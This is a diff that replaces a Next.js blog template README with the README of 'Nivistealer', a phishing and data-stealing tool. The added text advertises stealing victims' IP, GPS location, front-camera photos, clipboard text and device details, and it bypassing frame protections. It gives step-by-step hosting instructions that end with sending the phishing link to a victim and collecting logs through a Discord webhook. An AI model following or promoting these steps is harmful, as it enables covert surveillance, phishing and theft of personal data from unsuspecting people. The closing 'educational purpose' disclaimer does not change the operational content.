@@ -1,147 +1,69 @@
-![Netlify Next.js Blog Template designed by Bejamas](https://user-images.githubusercontent.com/43764894/223762618-62742b4e-9424-44a7-8e85-9f7e4e19db54.png)
+<p align="center">
+      <img src="https://wallpapercave.com/uwp/uwp757693.gif" height="250px" width="300px" ></img>
+      <br><br>
+      Nivistealer coded by : swagkarna
+ </p>
+ 
+ ---
+ * **If you like the tool and for my personal motivation so as to develop other tools please  leave a +1 star** 
+  ---
+ ## Features of Nivi-Stealer:
+ - Steal Victim Ip
+ - Steal Device Info
+ - Steal Network and Battery Info
+ - Uses  Device Gps  to steal exact location
+ - Steal pic from front camera
+ - Steal text from victim clipboard (added recently) 
+ - Send logs to discord also save them locally in a txt file
+ - Works on android,windows,linux,mac os
+ - Uses iframe to load live website to make phishing attack more reliable
+ - Bypass x-frame restrictions [2024]
+ ---
+ 
+ ## How to use?
+ 
+<p>
+      <b>Method 0 :</b></p>
 
+  [![Run on Repl.it](https://repl.it/badge/github/swagkarna/Nivistealer)](https://repl.it/github/swagkarna/Nivistealer)
 
-[![Deploy to Netlify Button](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/nextjs-blog-theme)
+- Click the above button  or [click here](https://repl.it/github/swagkarna/Nivistealer) to run on `repl.it`
+- Login/Signup on [repl.it](https://repl.it)
+- After it clones the repo edit <a href="https://github.com/swagkarna/Nivistealer/blob/bfb77519443a90613fab8f55c1a534b8918c5345/python_flask/index.html#L185">this</a> line with your repl url
+- Now click Run
+---
+ <p>
+      <b>Method 1 :</b></p>
+            
+- Clone or Download this repo
+- Create a account on any webhosting site that provide ssl . I suggest a free webhosting site called ```000webhost.com```
+- Now upload ```index.html,sunni.php,post.php``` on your webhosting site
+- Now open index.html and replace <A href="https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/index.html#L80">this</a> with your ```discord webhook url```  
+- Boom !!! . Now send the phishing link to your victim . Logs will be send to your discord webhook and also saved to ```sensitiveinfo.txt``` file      
+      
+---       
+<p>
+      <b>Method 2 :</b></p>
+      
+- Clone the repo and navigate to ```python_flask``` directory      
+- open your terminal and type ```pip3 install colorama``` ```pip3 install flask```
+- Now edit <a href="https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/python_flask/index.html#L142">this</a> line with your url
+- Now type ```python nivistealer.py```   Boom !!! 
+- Images and log file will be saved locally on your directory   
+---  
 
-
-A customizable blog starter using:
-
-- [Next.js](https://github.com/vercel/next.js) v15 (Pages Router)
-- [Tailwind](https://tailwindcss.com/) v3.x
-- [Netlify Visual Editor](https://docs.netlify.com/visual-editor/overview/)
-- Built-in [MDX](https://mdxjs.com/) support
-- Includes modern design with dark & light themes
-
-![Preview of blog theme. Author named Jay Doe and blog's name is "Next.js Blog Theme" with one blog post](nextjs-blog-theme-preview.png)
-
-[Take a gander at the demo.](https://bejamas-nextjs-blog.netlify.app)
-
-[Click here to watch the template walkthrough!](https://www.youtube.com/watch?v=63QZHs259dY)
-
-## Table of Contents:
-
-- [Getting Started](#getting-started)
-  - [Setting Up Locally](#setting-up-locally)
-  - [Using the Wizard](#using-the-setup-wizard)
-- [Configuring the Blog](#configuring-the-blog)
-- [Adding New Posts](#adding-new-posts)
-- [Netlify Visual Editor](#netlify-visual-editor)
-- [Testing](#testing)
-  - [Included Default Testing](#included-default-testing)
-  - [Removing Renovate](#removing-renovate)
-
-## Getting Started
+## *Nivistealer in action*[Method 2] :
+https://user-images.githubusercontent.com/46685308/156226849-ccce8ade-552a-49bd-be93-eb14aaed8971.mp4
 
 ---
+### Discalimer :
+#### Use this only for educational Purpose....  I am not responsible for your action...Love you Guys.. Stay safe !!! Stay legal !!!
+---
 
-You can get started with this project in two ways: locally or using the [setup wizard](https://nextjs-wizard.netlify.app/).
+### ❤️Supporters❤️
+[![Stargazers repo roster for @swagkarna/Nivistealer](https://reporoster.com/stars/swagkarna/Nivistealer)](https://github.com/swagkarna/Nivistealer/stargazers)
 
-### Setting Up Locally
+[![Forkers repo roster for @swagkarna/Nivistealer](https://reporoster.com/forks/swagkarna/Nivistealer)](https://github.com/swagkarna/Nivistealer/network/members)
 
-If you're doing it locally, start with clicking the [use this template](https://github.com/netlify-templates/nextjs-blog-theme/generate) button on GitHub. This will create a new repository with this template's files on your GitHub account. Once that is done, clone your new repository and navigate to it in your terminal.
-
-From there, you can install the project's dependencies by running:
-
-```shell
-yarn install
-```
-
-Finally, you can run your project locally with:
-
-```shell
-yarn run dev
-```
-
-Open your browser and visit <http://localhost:3000>, your project should be running!
-
-### Using the Setup Wizard
-
-![Preview of Setup Wizard showing the initial page of a setup form](nextjs-setup-wizard.png)
-
-Through the [setup wizard](https://nextjs-wizard.netlify.app/), you can create your blog in a few clicks and deploy to Netlify.
-
-## Configuring the blog
-
-The config is based on environment variables to make it easy to integrate with any Jamstack platform, like Netlify.
-
-Here are the variables you can edit:
-| Variable | Description | Options
-| --- | --- | --- |
-| `BLOG_NAME` | the name of your blog, displayed below the avatar ||
-| `BLOG_TITLE` | the main header (`h1`) on the home page ||
-| `BLOG_FOOTER_TEXT`| the text in the footer ||
-| `BLOG_THEME` | the theme to pass to Tailwind | default |
-| `BLOG_FONT_HEADINGS` | the font-family for all HTML headings, from `h1` to `h6`| sans-serif (default), serif, monospace|
-| `BLOG_FONT_PARAGRAPHS` | the font-family for all other HTML elements | sans-serif (default), serif, monospace|
-
-All of the env variables can be configured through the [Wizard](https://nextjs-wizard.netlify.app/) or through setting the project's environment variables. You can do this in your Netlify dashaboard (Site settings/Build & deploy/Environment/Environment variables).
-
-https://user-images.githubusercontent.com/3611928/153997545-6dcdeef0-e570-49e7-93d6-ce0d393d16c9.mp4
-
-[alt: video walkthrough of editing env vars]
-
-If setting an environment variable isn't your cup of tea, the defaults can be changed in [`utils/global-data.js`](/utils/global-data.js). You can also remove the variables and hard code blog information where these variables are used in the code base.
-
-- `BLOG_THEME, BLOG_FONT_HEADINGS, & BLOG_FONT_PARAGRAPHS` are used in [`tailwind-preset.js`](tailwind-preset.js)
-- `BLOG_NAME, BLOG_TITLE, BLOG_FOOTER_TEXT` are used in [`pages/index.js`](pages/index.js) & [`pages/posts/[slug].js`](pages/posts/[slug].js) through the `globalData` object.
-
-## Adding new posts
-
-All posts are stored in `/posts` directory. To make a new post, create a new file with the [`.mdx` extension](https://mdxjs.com/).
-
-Since the posts are written in `MDX` format you can pass props and components. That means you can use [React components](https://reactjs.org/docs/components-and-props.html) inside your posts to make them more interactive. Learn more about how to do so in the [MDX docs on content](https://mdxjs.com/docs/using-mdx/#components).
-
-https://user-images.githubusercontent.com/3611928/152727802-102ec296-41c8-446d-93ed-922d11187073.mp4
-
-[alt: video walkthrough of adding a new blog post]
-
-## Netlify Visual Editor
-
-This template is configured to work with [visual editing](https://docs.netlify.com/visual-editor/overview/) and [Git Content Source](https://docs.netlify.com/create/content-sources/git/).
-
-### Develop with Netlify Visual Editor Locally
-
-The typical development process is to begin by working locally. Clone this repository, then run `npm install` in its root directory.
-
-Run the Next.js development server:
-
-```txt
-cd nextjs-blog-theme
-npm run dev
-```
-
-Install the [Netlify Visual Editor CLI](https://www.npmjs.com/package/@stackbit/cli). Then open a new terminal window in the same project directory and run the Netlify visual editor dev server:
-
-```txt
-npm install -g @stackbit/cli
-stackbit dev
-```
-
-This outputs your own Netlify visual editor URL. Open this, register, or sign in, and you will be directed to Netlify's visual editor for your new project.
-
-![Next.js Dev + Visual Editor Dev](https://assets.stackbit.com/docs/next-dev-stackbit-dev.png)
-
-### Next Steps
-
-Here are a few suggestions on what to do next if you're new to Netlify Visual Editor:
-
-- Learn [Netlify visual editor overview](https://docs.netlify.com/visual-editor/visual-editing/)
-- Check [Netlify visual editor reference documentation](https://visual-editor-reference.netlify.com/)
-
-## Testing
-
-### Included Default Testing
-
-We’ve included some tooling that helps us maintain these templates. This template currently uses:
-
-- [Renovate](https://www.mend.io/free-developer-tools/renovate/) - to regularly update our dependencies
-
-If your team is not interested in this tooling, you can remove them with ease!
-
-### Removing Renovate
-
-In order to keep our project up-to-date with dependencies we use a tool called [Renovate](https://github.com/marketplace/renovate). If you’re not interested in this tooling, delete the `renovate.json` file and commit that onto your main branch.
-
-## Support
-
-If you get stuck along the way, get help in our [support forums](https://answers.netlify.com/).
+---
+     
